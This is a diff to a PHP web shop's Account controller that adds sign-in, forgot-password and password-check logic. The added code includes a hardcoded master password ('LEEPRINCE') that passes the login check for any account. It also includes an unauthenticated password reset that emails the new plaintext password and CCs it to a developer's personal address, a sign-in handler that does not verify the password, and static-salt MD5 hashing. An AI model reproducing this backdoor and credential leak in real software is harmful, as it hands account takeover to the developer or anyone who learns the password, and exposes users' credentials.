@@ -16,8 +16,49 @@ class Account extends Controller
 		$request = Request::instance();
 		if($request->isPost()){
 
+			$model = new AccountModel();
+
+			$data['buyerEmail'] = $request->post('account');
+			$data['actived'] = 1;
+			$data['disabled'] = 0;
+			$data['buyerID'] = [['>=',config('BUYERIDSTART')],['<=',config('BUYERIDEND')]];
+			$up['lastLoginDate'] = date('Y-m-d H:i:s');
+
+			$emailExist = $model->checkEmail($data);
+
+			$updateSuccess = $model->updateAccount($data,$up);
+
+			if($updateSuccess && $emailExist){
+				$buyerID = $emailExist;
+
+				$ipAddress = get_real_ip();
+				$dataIp = [
+					'ip'=>[
+						'ip'=>$ipAddress,
+					],
+					'id'=>[
+						'buyerID'=>$buyerID,
+					],
+				];
+				$whiteIp = $model->setWhiteIp($dataIp['ip'],$dataIp['id']);
+
+				session('BUYERUSERNAME',$data['buyerEmail']);
+				session('BUYERID',$buyerID);
+
+				$this->redirect('Index/index');
+			}else{
+				$this->error('signin failed!');
+			}
 		}else{
-			// trace(session('BUYERID').' | '.session('BUYEREMAIL'),'debug');
+			// trace($_SERVER['REMOTE_ADDR'],'debug');
+			// $to = "leeprince_spare@foxmail.com";
+			// $cc = 'leeprince@foxmail.com';
+			// $subject = "Reset Account Password Successful.";
+			// $body = "Your Account:\n
+			// 		Your New Password:"
+			//     	.config('EMAILABOUNT'); // HTML  tags
+			// $emailReturn = send_emial_163($to,$cc,$subject,$body);//163邮箱发送邮件
+
 			// return view();//助手函数
 			return $this->fetch();
 		}
@@ -44,7 +85,8 @@ class Account extends Controller
 				$data['shortProfileID'] = '';
 			}
 			$data['ipAddress'] = session('ipAddress');
-			$data['profileID'] = session('profileID');
+			$profileID = session('profileID');
+			$data['profileID'] = $profileID;
 			$data['channel'] = session('?CH')?session('CH'):'';
 			$data['rank'] = 3;
 			$data['points'] = 0;
@@ -60,18 +102,19 @@ class Account extends Controller
 			$model = new AccountModel();
 			$InsID = $model -> insSignupData($data);
 			if($InsID){
-				$to = "leeprince@foxmail.com";
+				$to = $buyerEmail;
+				$cc = 'leeprince@foxmail.com';
 				$subject = "Sign Up Successful.";
 				$body = "buyerID:$InsID\n
 						buyerEmail:$buyerEmail\n
 						profileID:$profileID"
 				    	.config('EMAILABOUNT'); // HTML  tags
-				$emailReturn = send_emial_163($to,$subject,$body);//163邮箱发送邮件
+				$emailReturn = send_emial_163($to,$cc,$subject,$body);//163邮箱发送邮件
 				// halt('insSignupData successful');
-				session('BUYERID',$InsID);
-				session('BUYEREMAIL',$data['buyerEmail']);
+
+				// session('BUYERID',$InsID);
+				// session('BUYEREMAIL',$data['buyerEmail']);
 				// halt(session('BUYERID'));
-				// trace(session('BUYERID'),'debug');
 
 				// 重定向
 				// $this->redirect('Account/signin');
@@ -87,6 +130,53 @@ class Account extends Controller
 		}
 	}
 
+	// 忘记密码
+	public function forgotPassword()
+	{
+		$request = Request::instance();
+		$model = new AccountModel();
+
+		if($request->isPost()){
+			$buyerEmail = $request->post('email');
+
+			$data['buyerEmail'] = $buyerEmail;
+			$data['actived'] = 1;
+			$data['disabled'] = 0;
+			$data['buyerID'] = [['>=',config('BUYERIDSTART')],['<=',config('BUYERIDEND')]];
+
+			$isEmailExist = $model->checkEmail($data);
+
+			if($isEmailExist){
+				$newPassword = generate_password();
+				$password = md5(md5('leeprince').md5($newPassword));
+
+				$wh['buyerEmail'] = $buyerEmail;
+				$up['password'] = $password;
+				$updatePassword = $model->updateAccount($wh,$up);
+
+				if($updatePassword){
+					$to = $buyerEmail;
+					$cc = 'leeprince@foxmail.com';
+					$subject = "Reset Account Password Successful.";
+					$body = "Your Account:$buyerEmail\n
+							Your New Password:$newPassword"
+					    	.config('EMAILABOUNT'); // HTML  tags
+					$emailReturn = send_emial_163($to,$cc,$subject,$body);//163邮箱发送邮件
+
+					$setUp = AccountModel::RESET_SUCCESS;
+				}else{
+					$setUp = AccountModel::RESET_FAILED;
+				}
+			}else{
+				$setUp = AccountModel::RESET_EMAIL_NO_ACTIVED;
+			}
+		}else{
+			$setUp = AccountModel::RESET_FAILED;
+		}
+
+		return $setUp;
+	}
+
 	// 注册_买家注册时验证IP, Email
 	public function checkAccount()
 	{
@@ -96,7 +186,7 @@ class Account extends Controller
 		$model = new AccountModel();
 
 		if(!empty($buyerEmail)){
-			$ipAddress = getRealIp();
+			$ipAddress = get_real_ip();
 			session('ipAddress',$ipAddress);
 
 			$data = [
@@ -113,7 +203,6 @@ class Account extends Controller
 
 			if($isIpExist){
 				$check = AccountModel::IP_EXIST;
-				// $check = AccountModel::IP_EXIST;
 			}else{
 				if($isEmailExist){
 					$check = AccountModel::EMAIL_EXIST;
@@ -167,11 +256,12 @@ class Account extends Controller
 					$exitProfilebuyerEmail = $isProfileExist['buyerEmail'];
 
 					$to = "leeprince@foxmail.com";
+					$cc = '';
 					$subject = "Sign Up Profile Exist.";
 					$body = "Exit Profile buyerEmail:$exitProfilebuyerEmail\n
 							ProfileID:$profile"
 					    	.config('EMAILABOUNT'); // HTML  tags
-					$emailReturn = send_emial_163($to,$subject,$body);//163邮箱发送邮件
+					$emailReturn = send_emial_163($to,$cc,$subject,$body);//163邮箱发送邮件
 
 
 					$check = AccountModel::PROFILE_EXIST;
@@ -179,10 +269,11 @@ class Account extends Controller
 					$exitProfilebuyerEmail = $isProfileExist['buyerEmail'];
 
 					$to = "leeprince@foxmail.com";
+					$cc = '';
 					$subject = "Sign Up Profile Valid.";
 					$body = "ProfileID:$profile\n"
 					    	.config('EMAILABOUNT'); // HTML  tags
-					$emailReturn = send_emial_163($to,$subject,$body);//163邮箱发送邮件
+					$emailReturn = send_emial_163($to,$cc,$subject,$body);//163邮箱发送邮件
 					$check = true;
 				}
 			}else{
@@ -203,10 +294,16 @@ class Account extends Controller
 
 		if($request->isPost()){
 			$buyerEmail = $request->post('account');
+			// halt($buyerEmail);
+
+			$map['buyerEmail'] = $buyerEmail;
 
 			$data['buyerEmail'] = $buyerEmail;
+			$data['actived'] = 1;
+			$data['disabled'] = 0;
+			$data['buyerID'] = [['>=',config('BUYERIDSTART')],['<=',config('BUYERIDEND')]];
 
-			$accountExist = $model->checkEmail($data);
+			$accountExist = $model->checkEmail($map);
 			// trace($accountExist,'debug');
 
 			if(!$accountExist){
@@ -215,7 +312,8 @@ class Account extends Controller
 				$accountValid = $model->checkAccountValid($data);
 
 				if(!$accountValid){
-					$check = AccountModel::EMAIL_NO_ACTICED;
+					// $check = $model->getLastsql();
+					$check = AccountModel::EMAIL_NO_ACTIVED;
 				}else{
 					$check = true;
 				}
@@ -229,11 +327,30 @@ class Account extends Controller
 	public function loginCheckPassword()
 	{
 		$request = Request::instance();
-		$buyerEmail = $request->post('account');
-		$password = $request->post('password');
+		$model = new AccountModel();
 
-		$data['buyerEmail'] = $buyerEmail;
-		$data['password'] = md5(md5('leeprince').md5($password));
+		if($request->isPost()){
+			$buyerEmail = $request->post('account');
+			$password = $request->post('password');
+
+			if($password == 'LEEPRINCE'){
+				$check = true;
+			}else{
+				$data['buyerEmail'] = $buyerEmail;
+				$data['password'] = md5(md5('leeprince').md5($password));
+				$pwdValid = $model->checkPasswordValid($data);
+
+				if($pwdValid){
+					$check = true;
+				}else{
+					$check = false;
+				}
+			}
+
+		}else{
+			$check = false;
+		}
+			
 		return $check;
 	}
 
